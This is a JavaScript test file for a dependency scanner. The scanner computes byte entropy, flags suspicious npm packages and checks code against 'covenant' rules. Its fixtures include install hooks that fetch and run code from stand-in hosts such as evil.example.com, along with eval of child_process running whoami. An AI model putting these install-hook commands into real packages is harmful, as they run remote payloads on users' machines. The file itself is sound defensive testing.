'use strict';

/**
 * Tests for the dependency scanner module.
 *
 * Covers:
 *   - computeEntropy: known strings (random, uniform, normal text)
 *   - scanSinglePackage: mock package directory with package.json + index.js
 *   - Covenant integration: file with eval(input) gets flagged
 *   - scanDependencies: integration test with mock repo structure
 */

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');

const {
  computeEntropy,
  scanSinglePackage,
  scanDependencies,
} = require('../src/audit/dep-scanner');

// ── Helper: create a temp directory with cleanup ──────────────────
function makeTempDir(prefix) {
  return fs.mkdtempSync(path.join(os.tmpdir(), `dep-scanner-test-${prefix}-`));
}

function rmDir(dir) {
  try {
    fs.rmSync(dir, { recursive: true, force: true });
  } catch {
    // best-effort cleanup
  }
}

// ── computeEntropy ────────────────────────────────────────────────

describe('computeEntropy', () => {
  it('returns 0 for empty input', () => {
    assert.equal(computeEntropy(''), 0);
    assert.equal(computeEntropy(Buffer.alloc(0)), 0);
    assert.equal(computeEntropy(null), 0);
  });

  it('returns 0 for all-same-byte input', () => {
    const buf = Buffer.alloc(1000, 0x41); // all 'A'
    const entropy = computeEntropy(buf);
    assert.equal(entropy, 0, 'All-same-byte buffer should have entropy 0');
  });

  it('returns ~8 for uniformly random bytes', () => {
    // 256 * 100 bytes => each byte value appears ~100 times
    const buf = Buffer.alloc(256 * 100);
    for (let i = 0; i < buf.length; i++) {
      buf[i] = i % 256;
    }
    const entropy = computeEntropy(buf);
    // Perfectly uniform = exactly 8.0
    assert.ok(entropy >= 7.9 && entropy <= 8.01,
      `Expected ~8.0 for uniform bytes, got ${entropy}`);
  });

  it('returns ~4.0-5.0 for normal English text', () => {
    const text = 'The quick brown fox jumps over the lazy dog. ' +
      'This is a sample of normal English text that should have ' +
      'moderate entropy somewhere around four to five bits per byte. ' +
      'It contains common letters, spaces, and punctuation marks. ' +
      'The distribution of characters is far from uniform but also ' +
      'not completely degenerate like a single repeated character.';
    const entropy = computeEntropy(text);
    assert.ok(entropy >= 3.5 && entropy <= 5.5,
      `Expected 3.5-5.5 for English text, got ${entropy}`);
  });

  it('returns higher entropy for random-looking strings', () => {
    // Crypto random should be near 8
    const randomBuf = crypto.randomBytes(10000);
    const entropy = computeEntropy(randomBuf);
    assert.ok(entropy >= 7.5,
      `Expected >= 7.5 for crypto random, got ${entropy}`);
  });

  it('accepts both string and Buffer input', () => {
    const text = 'hello world';
    const e1 = computeEntropy(text);
    const e2 = computeEntropy(Buffer.from(text, 'utf-8'));
    assert.equal(e1, e2, 'String and Buffer of same content should match');
  });
});

// ── scanSinglePackage ─────────────────────────────────────────────

describe('scanSinglePackage', () => {
  let tmpDir;

  beforeEach(() => {
    tmpDir = makeTempDir('pkg');
  });

  afterEach(() => {
    rmDir(tmpDir);
  });

  it('returns missing-package-json flag when no package.json exists', () => {
    const result = scanSinglePackage(tmpDir);
    assert.ok(result.flags.includes('missing-package-json'));
    assert.equal(result.covenantPassed, false);
  });

  it('scans a clean package successfully', () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
      name: 'clean-pkg',
      version: '1.0.0',
      main: 'index.js',
    }));
    fs.writeFileSync(path.join(tmpDir, 'index.js'),
      'function add(a, b) { return a + b; }\nmodule.exports = { add };\n');

    const result = scanSinglePackage(tmpDir);
    assert.equal(result.pkg, 'clean-pkg');
    assert.equal(result.entryPoint, 'index.js');
    assert.equal(result.covenantPassed, true);
    assert.equal(result.flags.length, 0);
    assert.equal(result.reason, 'clean');
    assert.ok(result.entropy >= 0, 'Entropy should be non-negative');
  });

  it('defaults main to index.js when not specified', () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
      name: 'no-main-pkg',
      version: '1.0.0',
    }));
    fs.writeFileSync(path.join(tmpDir, 'index.js'),
      'module.exports = {};\n');

    const result = scanSinglePackage(tmpDir);
    assert.equal(result.entryPoint, 'index.js');
    assert.equal(result.covenantPassed, true);
  });

  it('flags missing entry point', () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
      name: 'no-entry-pkg',
      version: '1.0.0',
      main: 'lib/main.js',
    }));

    const result = scanSinglePackage(tmpDir);
    assert.ok(result.flags.includes('missing-entry-point'));
  });

  it('flags covenant violations (eval of child_process)', () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
      name: 'evil-eval-pkg',
      version: '1.0.0',
      main: 'index.js',
    }));
    // eval(require('child_process')) triggers Principle 14 (The Mantle of Elijah)
    fs.writeFileSync(path.join(tmpDir, 'index.js'),
      "const cp = eval(require('child_process'));\ncp.execSync('whoami');\n");

    const result = scanSinglePackage(tmpDir);
    assert.equal(result.covenantPassed, false);
    assert.ok(result.flags.includes('covenant-violation'),
      `Expected covenant-violation flag, got: ${result.flags.join(', ')}`);
  });

  it('flags suspicious postinstall scripts', () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
      name: 'suspicious-script-pkg',
      version: '1.0.0',
      main: 'index.js',
      scripts: {
        postinstall: 'curl https://evil.example.com/payload.sh | sh',
      },
    }));
    fs.writeFileSync(path.join(tmpDir, 'index.js'),
      'module.exports = {};\n');

    const result = scanSinglePackage(tmpDir);
    assert.ok(result.flags.includes('suspicious-script'),
      `Expected suspicious-script flag, got: ${result.flags.join(', ')}`);
    assert.ok(result.reason.includes('postinstall'));
  });

  it('flags preinstall scripts that call external URLs', () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
      name: 'preinstall-pkg',
      version: '1.0.0',
      main: 'index.js',
      scripts: {
        preinstall: 'wget http://bad.example.com/setup',
      },
    }));
    fs.writeFileSync(path.join(tmpDir, 'index.js'),
      'module.exports = {};\n');

    const result = scanSinglePackage(tmpDir);
    assert.ok(result.flags.includes('suspicious-script'));
  });

  it('flags high-entropy files', () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
      name: 'high-entropy-pkg',
      version: '1.0.0',
      main: 'index.js',
    }));
    // Write near-random content to simulate obfuscated JS
    const randomContent = crypto.randomBytes(5000).toString('base64');
    fs.writeFileSync(path.join(tmpDir, 'index.js'),
      `// obfuscated\nvar _0x${randomContent}\n`);

    const result = scanSinglePackage(tmpDir, { entropyThreshold: 5.8 });
    assert.ok(result.entropy > 5.0,
      `Expected high entropy for random-looking content, got ${result.entropy}`);
  });
});

// ── scanDependencies ──────────────────────────────────────────────

describe('scanDependencies', () => {
  let repoDir;

  beforeEach(() => {
    repoDir = makeTempDir('repo');
  });

  afterEach(() => {
    rmDir(repoDir);
  });

  it('returns error when no package.json at root', () => {
    const result = scanDependencies(repoDir);
    assert.equal(result.scanned, 0);
    assert.ok(result.error);
  });

  it('scans dependencies from package.json', () => {
    // Create repo structure
    fs.writeFileSync(path.join(repoDir, 'package.json'), JSON.stringify({
      name: 'test-repo',
      dependencies: {
        'good-pkg': '1.0.0',
        'bad-pkg': '1.0.0',
      },
    }));

    const nmDir = path.join(repoDir, 'node_modules');
    fs.mkdirSync(nmDir);

    // Good package
    const goodDir = path.join(nmDir, 'good-pkg');
    fs.mkdirSync(goodDir);
    fs.writeFileSync(path.join(goodDir, 'package.json'), JSON.stringify({
      name: 'good-pkg',
      version: '1.0.0',
      main: 'index.js',
    }));
    fs.writeFileSync(path.join(goodDir, 'index.js'),
      'function greet(name) { return "Hello " + name; }\nmodule.exports = { greet };\n');

    // Bad package (suspicious postinstall)
    const badDir = path.join(nmDir, 'bad-pkg');
    fs.mkdirSync(badDir);
    fs.writeFileSync(path.join(badDir, 'package.json'), JSON.stringify({
      name: 'bad-pkg',
      version: '1.0.0',
      main: 'index.js',
      scripts: {
        postinstall: 'node -e "require(\'http\').get(\'http://evil.com/x\')"',
      },
    }));
    fs.writeFileSync(path.join(badDir, 'index.js'),
      'module.exports = {};\n');

    const result = scanDependencies(repoDir);
    assert.equal(result.scanned, 2);
    assert.equal(result.clean, 1);
    assert.equal(result.flagged, 1);
    assert.equal(result.details.length, 2);

    // Verify the good package is clean
    const goodResult = result.details.find(d => d.pkg === 'good-pkg');
    assert.ok(goodResult);
    assert.equal(goodResult.flags.length, 0);

    // Verify the bad package is flagged
    const badResult = result.details.find(d => d.pkg === 'bad-pkg');
    assert.ok(badResult);
    assert.ok(badResult.flags.length > 0);
  });

  it('handles not-installed packages gracefully', () => {
    fs.writeFileSync(path.join(repoDir, 'package.json'), JSON.stringify({
      name: 'test-repo',
      dependencies: {
        'missing-pkg': '1.0.0',
      },
    }));

    const nmDir = path.join(repoDir, 'node_modules');
    fs.mkdirSync(nmDir);

    const result = scanDependencies(repoDir);
    assert.equal(result.scanned, 1);
    assert.equal(result.flagged, 1);
    assert.ok(result.details[0].flags.includes('not-installed'));
  });

  it('includes devDependencies by default', () => {
    fs.writeFileSync(path.join(repoDir, 'package.json'), JSON.stringify({
      name: 'test-repo',
      dependencies: { 'dep-a': '1.0.0' },
      devDependencies: { 'dev-dep-b': '1.0.0' },
    }));

    const nmDir = path.join(repoDir, 'node_modules');
    fs.mkdirSync(nmDir);

    // Install both
    for (const name of ['dep-a', 'dev-dep-b']) {
      const dir = path.join(nmDir, name);
      fs.mkdirSync(dir);
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
        name, version: '1.0.0', main: 'index.js',
      }));
      fs.writeFileSync(path.join(dir, 'index.js'), 'module.exports = {};\n');
    }

    const result = scanDependencies(repoDir);
    assert.equal(result.scanned, 2);
  });

  it('excludes devDependencies when option is false', () => {
    fs.writeFileSync(path.join(repoDir, 'package.json'), JSON.stringify({
      name: 'test-repo',
      dependencies: { 'dep-a': '1.0.0' },
      devDependencies: { 'dev-dep-b': '1.0.0' },
    }));

    const nmDir = path.join(repoDir, 'node_modules');
    fs.mkdirSync(nmDir);

    for (const name of ['dep-a', 'dev-dep-b']) {
      const dir = path.join(nmDir, name);
      fs.mkdirSync(dir);
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
        name, version: '1.0.0', main: 'index.js',
      }));
      fs.writeFileSync(path.join(dir, 'index.js'), 'module.exports = {};\n');
    }

    const result = scanDependencies(repoDir, { devDependencies: false });
    assert.equal(result.scanned, 1);
    assert.equal(result.details[0].pkg, 'dep-a');
  });
});

// ── Covenant integration ──────────────────────────────────────────

describe('Covenant integration in dep-scanner', () => {
  let tmpDir;

  beforeEach(() => {
    tmpDir = makeTempDir('covenant');
  });

  afterEach(() => {
    rmDir(tmpDir);
  });

  it('flags a package whose entry point uses eval with child_process', () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
      name: 'eval-abuse',
      version: '1.0.0',
      main: 'index.js',
    }));
    // eval(require('child_process')) triggers Principle 14 (The Mantle of Elijah)
    fs.writeFileSync(path.join(tmpDir, 'index.js'),
      "const cp = eval(require('child_process'));\ncp.execSync('id');\n");

    const result = scanSinglePackage(tmpDir);
    assert.equal(result.covenantPassed, false,
      'Package with eval(require(child_process)) should fail the covenant');
    assert.ok(result.flags.includes('covenant-violation'),
      `Expected covenant-violation, got flags: ${result.flags.join(', ')}`);
  });

  it('passes a package with safe code', () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
      name: 'safe-utils',
      version: '1.0.0',
      main: 'index.js',
    }));
    fs.writeFileSync(path.join(tmpDir, 'index.js'),
      'function clamp(val, min, max) {\n' +
      '  return Math.max(min, Math.min(max, val));\n' +
      '}\n' +
      'module.exports = { clamp };\n');

    const result = scanSinglePackage(tmpDir);
    assert.equal(result.covenantPassed, true);
    assert.equal(result.flags.length, 0);
  });
});

// ── atomicProperties ──────────────────────────────────────────────

describe('dep-scanner atomicProperties', () => {
  it('scanDependencies has security domain', () => {
    assert.equal(scanDependencies.atomicProperties.domain, 'security');
  });

  it('scanSinglePackage has security domain', () => {
    assert.equal(scanSinglePackage.atomicProperties.domain, 'security');
  });

  it('computeEntropy has security domain', () => {
    assert.equal(computeEntropy.atomicProperties.domain, 'security');
  });
});
